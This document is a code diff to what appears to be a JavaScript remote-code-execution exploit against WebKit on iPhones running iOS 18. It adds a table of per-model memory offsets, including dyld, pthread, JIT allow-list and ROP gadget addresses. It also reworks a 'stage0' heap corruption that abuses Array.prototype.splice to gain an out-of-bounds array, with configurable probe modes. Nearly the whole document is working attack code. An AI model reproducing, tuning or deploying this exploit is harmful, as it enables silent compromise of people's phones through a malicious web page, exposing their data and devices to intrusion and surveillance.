@@ -27,6 +27,113 @@ BigInt.prototype.asInt32s = function() {
 [].shift();
 /* HEADERS END */
 rce_offsets = {
+   "iPhone15,2_22E240": {
+      AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken: 0x1ee8de198n,
+      AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker: 0x1ee8ddc80n,
+      AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest: 0x1ee8ddbe0n,
+      AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice: 0x1ee8ddc30n,
+      AVFAudio__OBJC_CLASS__AVSpeechUtterance: 0x1ee8dd028n,
+      AVFAudio__cfstr_SystemLibraryTextToSpeech: 0x1ec792358n,
+      AXCoreUtilities__DefaultLoader: 0x1ec59b9b0n,
+      CAPointer: 0x20n,
+      CFNetwork__gConstantCFStringValueTable: 0x1ef76dea0n,
+      CGContextDelegate: 0x28n,
+      CMPhoto__CMPhotoCompressionCreateContainerFromImageExt: 0x1abfd53b4n,
+      CMPhoto__CMPhotoCompressionCreateDataContainerFromImage: 0x1abfd550cn,
+      CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage: 0x1abf4fd1cn,
+      CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation: 0x1abfa554cn,
+      CMPhoto__CMPhotoCompressionSessionAddCustomMetadata: 0x1abfa5ab0n,
+      CMPhoto__CMPhotoCompressionSessionAddExif: 0x1abfa566cn,
+      CMPhoto__kCMPhotoTranscodeOption_Strips: 0x1e8dc26e8n,
+      DesktopServicesPriv_bss: 0x1eda56fc8n,
+      Foundation__NSBundleTables_bundleTables_value: 0x18184ff38n,
+      GPUConnectionToWebProcess_m_remoteGraphicsContextGLMap: 0xf0n,
+      GPUProcess_singleton: 0x1ec703b18n,
+      GetCurrentThreadTLSIndex_CurrentThreadIndex: 0x1ef629b90n,
+      HOMEUI_cstring: 0x182f8f696n,
+      IOSurfaceContextDelegate: 0x120n,
+      IOSurfaceDrawable: 0x150n,
+      IOSurfaceQueue: 0x48n,
+      ImageIO__IIOLoadCMPhotoSymbols: 0x1886ce850n,
+      ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt: 0x1ee7bd9f0n,
+      ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage: 0x1ee7bd6a0n,
+      ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage: 0x1ee7bd6a8n,
+      ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation: 0x1ee7bd6b0n,
+      ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata: 0x1ee7bd5f0n,
+      ImageIO__gFunc_CMPhotoCompressionSessionAddExif: 0x1ee7bd6b8n,
+      ImageIO__gImageIOLogProc: 0x1ef7f8160n,
+      JavaScriptCore__globalFuncParseFloat: 0x19a5e52b0n,
+      JavaScriptCore__jitAllowList: 0x1f0ddc140n,
+      JavaScriptCore__jitAllowList_once: 0x1f0ddbf58n,
+      MediaAccessibility__MACaptionAppearanceGetDisplayType: 0x1ba7dcac8n,
+      PerfPowerServicesReader_cstring: 0x257557e60n,
+      RemoteGraphicsContextGLWorkQueue: 0x1ee85dc58n,
+      RemoteRenderingBackendProxy_off: 0x830n,
+      Security__SecKeychainBackupSyncable_block_invoke: 0x18b5e3eb0n,
+      Security__SecOTRSessionProcessPacketRemote_block_invoke: 0x18b5f8180n,
+      Security__gSecurityd: 0x1ec45fbf8n,
+      TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit: 0x1eeb904c8n,
+      UI_m_connection: 0x28n,
+      WebCore__DedicatedWorkerGlobalScope_vtable: 0x1f21d4998n,
+      WebCore__PAL_getPKContactClass: 0x1ee861eb8n,
+      WebCore__TelephoneNumberDetector_phoneNumbersScanner_value: 0x197e35e9cn,
+      WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts: 0x1ec6b8818n,
+      WebCore__initPKContact_once: 0x1ee86aa10n,
+      WebCore__initPKContact_value: 0x1ee86aa18n,
+      WebCore__softLinkDDDFACacheCreateFromFramework: 0x1ee8691b8n,
+      WebCore__softLinkDDDFAScannerFirstResultInUnicharArray: 0x1ee8691b0n,
+      WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType: 0x1ee8691a0n,
+      WebCore__softLinkOTSVGOTSVGTableRelease: 0x1ef9844e8n,
+      WebProcess_ensureGPUProcessConnection: 0x198f16f90n,
+      WebProcess_gpuProcessConnectionClosed: 0x199862d04n,
+      WebProcess_singleton: 0x1ee85ee00n,
+      __pthread_head: 0x269b68020n,
+      dyld__RuntimeState_emptySlot: 0x1a966f928n,
+      dyld__RuntimeState_vtable: 0x1f36beef0n,
+      dyld__dlopen_from_lambda_ret: 0x1a96519d8n,
+      dyld__signPointer: 0x1a96401e0n,
+      emptyString: 0x1f229c458n,
+      free_slabs: 0x1ee7a47d0n,
+      gadget_control_1_ios184: 0x23eb0d2ecn,
+      gadget_control_2_ios184: 0x1a964def8n,
+      gadget_control_3_ios184: 0x21ed9df24n,
+      gadget_loop_1_ios184: 0x18660a5a4n,
+      gadget_loop_2_ios184: 0x20d0cab28n,
+      gadget_loop_3_ios184: 0x184d6ad9cn,
+      gadget_set_all_registers_ios184: 0x20db4a20cn,
+      jsc_base: 0x198ce8000n,
+      libARI_cstring: 0x218612820n,
+      libGPUCompilerImplLazy__invoker: 0x23c8b435cn,
+      libGPUCompilerImplLazy_cstring: 0x23b9fe870n,
+      libdyld__dlopen: 0x1a964fa88n,
+      libdyld__dlsym: 0x1a9645220n,
+      libdyld__gAPIs: 0x1ee3b8000n,
+      libsystem_c__atexit_mutex: 0x1ee6c9a98n,
+      libsystem_kernel__thread_suspend: 0x1d379d1c0n,
+      libsystem_pthread_base: 0x20d119000n,
+      libsystem_pthread_linkedit: 0x272058000n,
+      m_backend: 0x70n,
+      m_drawingArea: 0x50n,
+      m_gpuProcessConnection: 0x158n,
+      m_gpuProcessConnection_m_identifier: 0x38n,
+      m_imageBuffer: 0x18n,
+      m_isRenderingSuspended: 0xe8n,
+      m_platformContext: 0x38n,
+      m_remoteDisplayLists: 0x70n,
+      m_remoteRenderingBackendMap: 0xe8n,
+      m_webProcessConnections: 0x80n,
+      mach_task_self_ptr: 0x1ee6c8d00n,
+      mainRunLoop: 0x1ee92c020n,
+      privateState_off: 0x7e8n,
+      pthread_create: 0x20d11e864n,
+      pthread_create_auth_stubs_offset: 0x2c67640n,
+      pthread_create_jsc: 0x19b94f640n,
+      pthread_create_offset: 0x5864n,
+      runLoopHolder_tid: 0x1ee93c708n,
+      rxBufferMtl_off: 0x100n,
+      rxMtlBuffer_off: 0x70n,
+      vertexAttribVector_off: 0x2548n,
+   },
    "iPhone14,7_22E240": {
       AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken: 0x1ee8de058n,
       AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker: 0x1ee8ddb40n,
@@ -14356,6 +14463,46 @@ const device_chipset = {
     start() {
         this.lastFailure = "";
         const attempt_idx = Number(globalThis.__bb_rce_attempt_idx || 0);
+        const getStage0Mode = () => {
+            try {
+                let params = new URLSearchParams(location.search || "");
+                let raw = params.get("stage0");
+                return raw === null ? "" : raw.toLowerCase().trim();
+            } catch(e) {
+                return "";
+            }
+        }
+        const supportsStage0Probe = () => {
+            let parts = String(ios_version || "").split(",");
+            let major = parseInt(parts[0] || "0", 10);
+            let minor = parseInt(parts[1] || "0", 10);
+            if (!isFinite(major) || !isFinite(minor)) return false;
+            return major == 18 && minor < 4;
+        }
+        const stage0_modes = ["orig", "keep-result", "call-keep-result", "jit-ignore", "jit-extract", "shape-start29", "shape-start31", "shape-insert8", "shape-len31", "shape-len33"];
+        let requested_stage0_mode = getStage0Mode();
+        let stage0_probe_allowed = supportsStage0Probe();
+        let stage0_mode = stage0_probe_allowed ? (requested_stage0_mode || "probe") : "orig";
+        if (stage0_mode == "probe") {
+            stage0_mode = stage0_modes[attempt_idx % stage0_modes.length];
+        } else if (stage0_modes.indexOf(stage0_mode) < 0) {
+            stage0_mode = "orig";
+        }
+        const getStage0Config = (mode) => {
+            let cfg = { target_length: 32, splice_start: 30, insert_values: [1,2,3,4,5,6,7] };
+            if (mode == "shape-start29") cfg.splice_start = 29;
+            else if (mode == "shape-start31") cfg.splice_start = 31;
+            else if (mode == "shape-insert8") cfg.insert_values = [1,2,3,4,5,6,7,8];
+            else if (mode == "shape-len31") {
+                cfg.target_length = 31;
+                cfg.splice_start = 29;
+            } else if (mode == "shape-len33") {
+                cfg.target_length = 33;
+                cfg.splice_start = 31;
+            }
+            return cfg;
+        }
+        const stage0_cfg = getStage0Config(stage0_mode);
         const victim_array_allocation_size = (0x120>>3);
         const victim_array_allocations_in_page = 50;
         var victim_cursor = 0;
@@ -14368,23 +14515,23 @@ const device_chipset = {
         const victim_array_RO = () =>  {return [1.1,2.2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8];}
         var victim_list = new Array(victim_list_size).fill(1.1);
 
-        const make_splice_target = () => {
+        const make_splice_target = (target_length) => {
             let target = new Array();
             target[14] = 1.1;
             for(let i = 0 ; i < 12; i++){
                 target[i] = i;
             }
             target[1001] = 1.1;
-            target.length = 31;
+            target.length = target_length - 1;
             delete target[0];
-            for(let i = 1; i < 31; i++){
+            for(let i = 1; i < target_length - 1; i++){
                 target[i] = 1.1;
             } //object should have 0x1e(30) items loaded, we want to overwrite +0x25(37)
-            target.length = 32;
+            target.length = target_length;
             return target;
         }
 
-        var the_oob_object = make_splice_target();
+        var the_oob_object = make_splice_target(stage0_cfg.target_length);
 
         //var the_oob_object = the_oob_object_RO();
         //the_oob_object[0] = 1.1; // we do this allocation now so thatonly on double->withStorage we will allocate.
@@ -14412,8 +14559,10 @@ const device_chipset = {
             victim_cursor++;
         }
 
-        const oob_object_target_length = 32;
-        const holes_to_add = (oob_object_target_length - 30);
+        const oob_object_target_length = stage0_cfg.target_length;
+        const stage0_splice_start = stage0_cfg.splice_start;
+        const stage0_insert_values = stage0_cfg.insert_values;
+        const holes_to_add = Math.max(0, oob_object_target_length - stage0_splice_start);
 
         for (let j = 6 ; j < victim_array_allocations_in_page; j++){
             victim_list[victim_cursor][0] = 3;
@@ -14498,50 +14647,24 @@ const device_chipset = {
         otherGlobalObject.dontjitme_contigious();
         dontjitme_float();
 
-        const getStage0Mode = () => {
-            try {
-                let params = new URLSearchParams(location.search || "");
-                let raw = params.get("stage0");
-                return raw === null ? "" : raw.toLowerCase().trim();
-            } catch(e) {
-                return "";
-            }
-        }
-        const supportsStage0Probe = () => {
-            let parts = String(ios_version || "").split(",");
-            let major = parseInt(parts[0] || "0", 10);
-            let minor = parseInt(parts[1] || "0", 10);
-            if (!isFinite(major) || !isFinite(minor)) return false;
-            return major == 18 && minor < 4;
-        }
-        const stage0_modes = ["orig", "keep-result", "call-keep-result", "jit-ignore", "jit-extract"];
-        let requested_stage0_mode = getStage0Mode();
-        let stage0_probe_allowed = supportsStage0Probe();
-        let stage0_mode = stage0_probe_allowed ? (requested_stage0_mode || "probe") : "orig";
-        if (stage0_mode == "probe") {
-            stage0_mode = stage0_modes[attempt_idx % stage0_modes.length];
-        } else if (stage0_modes.indexOf(stage0_mode) < 0) {
-            stage0_mode = "orig";
-        }
-
         const warm_splice_ignore = (target) => {
-            target.splice(30,0,1,2,3,4,5,6,7);
+            target.splice.apply(target, [stage0_splice_start,0].concat(stage0_insert_values));
             return target.length;
         }
         const warm_splice_extract = (target) => {
-            let result = target.splice(30,0,1,2,3,4,5,6,7);
+            let result = target.splice.apply(target, [stage0_splice_start,0].concat(stage0_insert_values));
             return result.length + target.length;
         }
         const warm_splice_mode = (fn, count) => {
             let observed = 0;
             for (let i = 0; i < count; i++) {
-                observed += fn(make_splice_target());
+                observed += fn(make_splice_target(oob_object_target_length));
             }
             return observed;
         }
 
         const jit_wait_ms = wait_for_jit_compilation_ms;
-        print(`stage0 setup: attempt=${attempt_idx + 1} jit_wait_ms=${jit_wait_ms} stage0_mode=${stage0_mode} requested_stage0_mode=${requested_stage0_mode} stage0_probe_allowed=${stage0_probe_allowed} victim_cursor=${victim_cursor} victim_allocations=${victim_array_allocations_in_page} target_length=${oob_object_target_length} holes_to_add=${holes_to_add} magic_tail=128636`);
+        print(`stage0 setup: attempt=${attempt_idx + 1} jit_wait_ms=${jit_wait_ms} stage0_mode=${stage0_mode} requested_stage0_mode=${requested_stage0_mode} stage0_probe_allowed=${stage0_probe_allowed} victim_cursor=${victim_cursor} victim_allocations=${victim_array_allocations_in_page} target_length=${oob_object_target_length} splice_start=${stage0_splice_start} insert_count=${stage0_insert_values.length} holes_to_add=${holes_to_add} magic_tail=128636`);
 
         return sleep(jit_wait_ms).then(() => {
 
@@ -14555,11 +14678,11 @@ const device_chipset = {
             let splice_result_len = -1;
             let splice_observed = -1;
             if (stage0_mode == "keep-result") {
-                let splice_result = the_oob_object.splice(30,0,1,2,3,4,5,6,7);
+                let splice_result = the_oob_object.splice.apply(the_oob_object, [stage0_splice_start,0].concat(stage0_insert_values));
                 splice_result_len = splice_result.length;
                 globalThis.__bb_stage0_splice_result = splice_result;
             } else if (stage0_mode == "call-keep-result") {
-                let splice_result = otherGlobalObject.Array.prototype.splice.call(the_oob_object,30,0,1,2,3,4,5,6,7);
+                let splice_result = otherGlobalObject.Array.prototype.splice.apply(the_oob_object, [stage0_splice_start,0].concat(stage0_insert_values));
                 splice_result_len = splice_result.length;
                 globalThis.__bb_stage0_splice_result = splice_result;
             } else if (stage0_mode == "jit-ignore") {
@@ -14567,7 +14690,7 @@ const device_chipset = {
             } else if (stage0_mode == "jit-extract") {
                 splice_observed = warm_splice_extract(the_oob_object);
             } else {
-                the_oob_object.splice(30,0,1,2,3,4,5,6,7);
+                the_oob_object.splice.apply(the_oob_object, [stage0_splice_start,0].concat(stage0_insert_values));
             }
 
             //now we should have a victim with a nice length.
@@ -14592,7 +14715,7 @@ const device_chipset = {
                     }
                 }
                 if(oob_array_idx === undefined){
-                    this.failStage("stage0", `no oversized victim array after splice; stage0_mode=${stage0_mode} requested_stage0_mode=${requested_stage0_mode} stage0_probe_allowed=${stage0_probe_allowed} splice_result_len=${splice_result_len} splice_observed=${splice_observed} victim_cursor=${victim_cursor} victim_allocations=${victim_array_allocations_in_page} target_length=${oob_object_target_length} holes_to_add=${holes_to_add} magic_tail=128636 threshold>${victim_array_allocation_size*10} max_length=${max_victim_length} max_idx=${max_victim_idx} counter=${counter} hole_setter_counter=${hole_setter_counter} double_magic_counter=${double_magic_counter} debug_len=${debug_1.length} oob_object_len=${the_oob_object.length} jit_wait_ms=${jit_wait_ms}`);
+                    this.failStage("stage0", `no oversized victim array after splice; stage0_mode=${stage0_mode} requested_stage0_mode=${requested_stage0_mode} stage0_probe_allowed=${stage0_probe_allowed} splice_result_len=${splice_result_len} splice_observed=${splice_observed} victim_cursor=${victim_cursor} victim_allocations=${victim_array_allocations_in_page} target_length=${oob_object_target_length} splice_start=${stage0_splice_start} insert_count=${stage0_insert_values.length} holes_to_add=${holes_to_add} magic_tail=128636 threshold>${victim_array_allocation_size*10} max_length=${max_victim_length} max_idx=${max_victim_idx} counter=${counter} hole_setter_counter=${hole_setter_counter} double_magic_counter=${double_magic_counter} debug_len=${debug_1.length} oob_object_len=${the_oob_object.length} jit_wait_ms=${jit_wait_ms}`);
                     return false;
                 }
                 oob_array = victim_list[oob_array_idx];
@@ -14604,7 +14727,7 @@ const device_chipset = {
                     }
                 }
                 if(overlap_array_idx === undefined){
-                    this.failStage("stage0", `oversized victim found but egg scan failed; stage0_mode=${stage0_mode} requested_stage0_mode=${requested_stage0_mode} stage0_probe_allowed=${stage0_probe_allowed} splice_result_len=${splice_result_len} splice_observed=${splice_observed} oob_array_idx=${oob_array_idx} oob_length=${oob_array.length} scan_limit=${victim_array_allocation_size*10} egg1=0x${egg1.toString(16)} egg2=0x${egg2.toString(16)} counter=${counter} hole_setter_counter=${hole_setter_counter} double_magic_counter=${double_magic_counter} debug_len=${debug_1.length} oob_object_len=${the_oob_object.length} jit_wait_ms=${jit_wait_ms}`);
+                    this.failStage("stage0", `oversized victim found but egg scan failed; stage0_mode=${stage0_mode} requested_stage0_mode=${requested_stage0_mode} stage0_probe_allowed=${stage0_probe_allowed} splice_result_len=${splice_result_len} splice_observed=${splice_observed} oob_array_idx=${oob_array_idx} oob_length=${oob_array.length} target_length=${oob_object_target_length} splice_start=${stage0_splice_start} insert_count=${stage0_insert_values.length} scan_limit=${victim_array_allocation_size*10} egg1=0x${egg1.toString(16)} egg2=0x${egg2.toString(16)} counter=${counter} hole_setter_counter=${hole_setter_counter} double_magic_counter=${double_magic_counter} debug_len=${debug_1.length} oob_object_len=${the_oob_object.length} jit_wait_ms=${jit_wait_ms}`);
                     return false;
                 }
                 this.oob_array = oob_array;
